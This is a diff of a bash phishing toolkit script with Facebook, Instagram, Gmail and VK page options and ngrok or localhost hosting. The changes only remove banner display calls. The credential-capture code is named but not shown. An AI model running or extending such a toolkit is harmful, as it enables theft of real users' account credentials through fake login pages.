@@ -173,7 +173,7 @@ start_ngrok() {
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
 
-	{ sleep 8; clear; banner_small; }
+	{ sleep 8; clear; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
@@ -185,14 +185,14 @@ start_ngrok() {
 start_localhost() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
-	{ sleep 1; clear; banner_small; }
+	{ sleep 1; clear; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
 ## Tunnel selection
 tunnel_menu() {
-	#{ clear; banner_small; }
+	#{ clear; }
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
@@ -243,7 +243,7 @@ site_facebook() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_facebook; }
+		{ sleep 1; clear; site_facebook; }
 	fi
 }
 
@@ -278,7 +278,7 @@ site_instagram() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_instagram; }
+		{ sleep 1; clear; site_instagram; }
 	fi
 }
 
@@ -308,7 +308,7 @@ site_gmail() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_gmail; }
+		{ sleep 1; clear; site_gmail; }
 	fi
 }
 
@@ -333,7 +333,7 @@ site_vk() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_vk; }
+		{ sleep 1; clear; site_vk; }
 	fi
 }
 
